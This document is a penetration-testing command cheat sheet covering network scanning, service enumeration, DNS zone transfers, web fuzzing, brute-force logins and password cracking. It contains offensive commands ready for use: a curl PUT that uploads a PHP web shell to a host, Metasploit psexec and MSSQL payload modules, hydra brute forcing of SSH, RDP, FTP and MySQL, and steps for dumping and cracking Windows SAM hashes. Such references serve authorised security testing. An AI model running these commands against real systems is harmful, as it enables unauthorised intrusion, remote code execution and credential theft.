
### useful curl

```
curl -s -I http://example.org | grep '^HTTP'
curl -s -I https://example.org | grep '^HTTP'
curl -s -I https://example.org | grep '^Strict'
curl --sslv3 https://example.org
curl --tlsv1.0 -I https://example.org
curl --tlsv1.1 -I https://example.org
curl --tlsv1.2 -s -I https://example.org | grep 'HTTP'
curl -s -I https://example.org | grep '^X-Frame-Options'
curl -s -I https://example_2.org | grep '^X-Frame-Options'
curl -s -I https://example.org | grep '^X-Content'
curl -s -I example.com/url_that_sets_cookie | grep '^Set-Cookie'
nmap -p 443,80 --script http-security-headers
curl -I -L --url <target domain or IP>
curl -L http://www.google.com (HTTP Location Headers with -L option)
curl -I 
curl -x http://10.10.10.10:8080 -L http://sample.com (Local Proxy)
curl -v https://google.com (Testing a connection to a remote site)
curl -I -H 'Accept-Encoding: gzip,deflate' http://example.com/index.php (Checking Header)
curl -v -X OPTIONS http://192.168.56.103 (Check OPTIONS)
curl -X PUT -d '<?php system($_GET["c"]);' http://192.168.200.150/1.php
```

### Nmap Advance Scan
```
nmap -Pn -sV -T 5 -oG - -p 21,22,80,443,1433,3389 10.0.0.* | grep open
nmap -Pn -sV -T 5 -oG - -p 21,22,80,443,1433,3389 10.0.0.* | awk '/open/{print $2 " " $3}'
nmap -Pn -sV -T 5 -oG - -p 21,22,80,443,1433,3389 10.0.0.* | awk '/open/{print $2}' | wc -l
nmap -Pn -sV -T 5 -oG - -p 21,22,80,443,1433,3389 10.0.0.* | awk '/open/{print $2}'
nmap -Pn -sV -T 5 -oG - -p 21,22,80,443,1433,3389 10.0.0.* | awk '/open/{print $2}' > ~/labnet-ip-list.txt
nmap -p80 --script dns-brute strategicsec.com
nmap --script http-robtex-reverse-ip secore.info
nmap -Pn -p80 --script=http-headers strategicsec.com
nmap -sS -sU -PN -p 1-65535 192.168.0.164(TCP SYN and UDP)
nmap --script http-methods
nmap -p 80 --script dns-brute.nse 
nmap --script http-enum
 nmap -Pn -p80 --script=http-headers x.x.x.x
```

### Oracle Attack Methodology

```
oscanner -s 192.168.1.200 -P 1521
nmap --script=oracle-tns-version
nmap -p 1521 -A TARGET
nmap --script=oracle-brute 
auxiliary/scanner/oracle/tnslsnr_version ( Oracle - Version)
auxiliary/scanner/oracle/tnspoison_checker
auxiliary/scanner/oracle/sid_enum
auxiliary/admin/oracle/sid_brute
auxiliary/scanner/http/oracle_ilom_login
```

### SMB service Exploit 

```
auxiliary/scanner/smb/smb_login
use auxiliary/scanner/smb/smb_enumusers
exploit/windows/smb/psexec 
```
### null sessions
```
nmap –script smb-enum-users.nse –p 445
rpcclient –U “” [target IP address]
querydominfo
enumdomusers
queryuser [username] # queryuser msfadmin
enum4linux 192.168.200.129
smbclient //192.168.0.14/tmp
```
### SNMP Service Exploit

```
auxiliary/scanner/snmp/snmp_login 
auxiliary/scanner/snmp/snmp_enumusers
auxiliary/scanner/snmp/snmp_enumshares
auxiliary/scanner/snmp/snmp_enum

hydra -P pass.txt  <Target> snmp 
nmap -sU -v --script snmp-brute --script-args passdb=passwords.lst <Target>  
nmap -sU -v --script snmp-brute --script-args userdb=usernames.lst,passdb=passwords.lst <Target> 


```

### MSSQL

```
nmap -sU --script=ms-sql-info 192.168.1.108 192.168.1.156
auxiliary/admin/mssql/mssql_enum
auxiliary/scanner/oracle/tnspoison_checker
auxiliary/scanner/mssql/mssql_ping
exploit/windows/mssql/mssql_payload

```



### VPN Accessment 
```
Ipsec Enumeration
ike-scan --showbackoff 10.0.0.3 10.0.0.6

ike-scan -M 172.16.21.200
```

### Enumeration & Attacking Network Services

```
SNMP Enumeration
snmpcheck -t 192.168.1.X -c public
snmpwalk -c public -v1 192.168.1.X 1
snmpwalk -c public -v1 192.168.1.X 1| grep hrSWRunName|cut -d* * -f 
snmpenum -t 192.168.1.X

nmblookup -A 1.1.1.1
smbclient //MOUNT/share -I target -N
rpcclient -U "" 1.1.1.1
enum4linux target
nbtscan 192.168.1.0/24
enum4linux -a target-ip
Fingerprint SMB Version(smbclient -L //192.168.1.100)
```

### Useful Metasploit Scan
```
scanner/ftp/ftp_version
scanner/ssh/ssh_version
scanner/mssql/mssql_ping
scanner/smb/smb_version
auxiliary/scanner/misc/oki_scanner                                 
auxiliary/scanner/snmp/aix_version                                 
auxiliary/scanner/snmp/cisco_config_tftp                            
auxiliary/scanner/snmp/cisco_upload_file                            
auxiliary/scanner/snmp/snmp_enum                                   
auxiliary/scanner/snmp/snmp_enumshares                             
auxiliary/scanner/snmp/snmp_enumusers                              
auxiliary/scanner/snmp/snmp_login                                 
auxiliary/scanner/snmp/snmp_set 
auxiliary/gather/enum_dns
auxiliary/scanner/http/http_version			
auxiliary/scanner/http/tomcat_enum
auxiliary/scanner/ssh/ssh_users			 
auxiliary/scanner/ssh/ssh_login	
auxiliary/scanner/http/joomla_plugins
auxiliary/scanner/http/wordpress_scanner
auxiliary/scanner/http/joomla_version



```

### DNS Recon and MX Record

```
nslookup -query=mx redhat.com
nslookup -type=ns redhat.com
nslookup -type=soa redhat.com
nslookup -type=any google.com
Using Specific DNS server
nslookup redhat.com ns1.redhat.com
nslookup -port 56 redhat.com
nslookup -debug redhat.com
whois domain-name-here.com
Perform DNS IP Lookup (dig a domain-name-here.com @nameserver )
Perform MX Record Lookup (dig mx domain-name-here.com @nameserver)
Perform Zone Transfer with DIG(dig axfr domain-name-here.com @nameserver)
dig 1.1.1.1 -t any
dig 1.1.1.1 -t mx
dig 1.1.1.1 -t axfr
dig -x 1.1.1.1

dnsrecon -d 1.1.1.1
dnsenum nintendo.com
host -t ns megacorpone.com
host -t mx megacorpone.com
host idontexist.megacorpone.com
```

### DNS Zone Transfers
```
nslookup -> set type=any -> ls -d blah.com
dig axfr blah.com @ns1.blah.com
host -l megacorpone.com ns1.megacorpone.com
host -l megacorpone.com ns2.megacorpone.com
dnsrecon -d megacorpone.com -t axf
```

### Wfuzz Web application fuzzer

```
wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://192.168.1.202/FUZZ
wfuzz -c -z file,/usr/share/wfuzz/wordlist/vulns/sql_inj.txt --hc 404 http://192.168.1.202/FUZZ
wfuzz.py -c -v -w wordlist/general/common.txt --hc 404 https://portswigger.net/FUZZ
wfuzz -c -v -z file,wordlist/Injections/SQL.txt --hc 404 http://www.example.com/index.php?id=FUZZ
wfuzz -c -z -v --sc 200 -z file,pass.txt -d "username=admin&password=FUZZ" http://example.com/login.php
```
### Blute Force Netwrok Service

```
hydra -t 5 -V -f -l root -P common.txt ftp://192.168.67.132
hydra -t 1 -V -f -l administrator -P common.txt rdp://192.168.67.132
hydra -t 5 -V -f -l root -P common.txt localhost ssh
hydra -t 5 -V -f -l root -e ns -P common.txt localhost mysql

hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX ftp -V

hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f 192.168.X.XXX pop3 -V

hydra -P /usr/share/wordlistsnmap.lst 192.168.X.XXX smtp -V

```
### ALL windows password Cracking 

```
make you that system file and sam to your Desktop (somewhere)

Step 1- bkhive system /root/Desktop/sample.txt
Step-2 -samdump2 SAM /root/Destop/sample.txt > /root/hash.txt

Step-3 Crack password hashes using John the Ripper
john --format=nt2 hash.txt
Step-4  View the hash file To view cracking Password 
```

### Passive Operating System Fingerprinting

```
p0f -i eth0 -p
p0f -i eth1 âvto output.txt
ping x.x.x.x
```

### VOIP Assessment

```
auxiliary/scanner/sip/options
auxiliary/scanner/sip/vsipinvate
smap 192.168.1.104 (Scanning a single host)
smap 192.168.1.130/24(Scanning a range of IP )
smap -O 192.168.1.104 ( SMAP to fingerprint the server/client type and version)
sip-scan -i eth0 192.168.1.1-254(Scanning a subnet)
svmap.py 192.168.1.1-254(Scanning an IP range)
svmap.py 192.168.1.1-254 --fp(fingerprinting scanning)
### http://www.backtrack-linux.org/wiki/index.php/Pentesting_VOIP
```


###
```
OS finger Print

#xprobe2 -v 192.168.0.174

Specific Source Ports to Bypass Filtering
hping2 -c 3 -s 53 -p 139 -S 192.168.0.1
```

### SMTP User enumeration

```
smtp-user-enum -M VRFY -U users.txt -t 10.0.0.1
smtp-user-enum -M VRFY -u root -t 10.0.0.1
smtp-user-enum -M RCPT -U users.txt -T mail-server-ips.txt
smtp-user-enum -M EXPN -D example.com -U users.txt -t 10.0.0.1
```
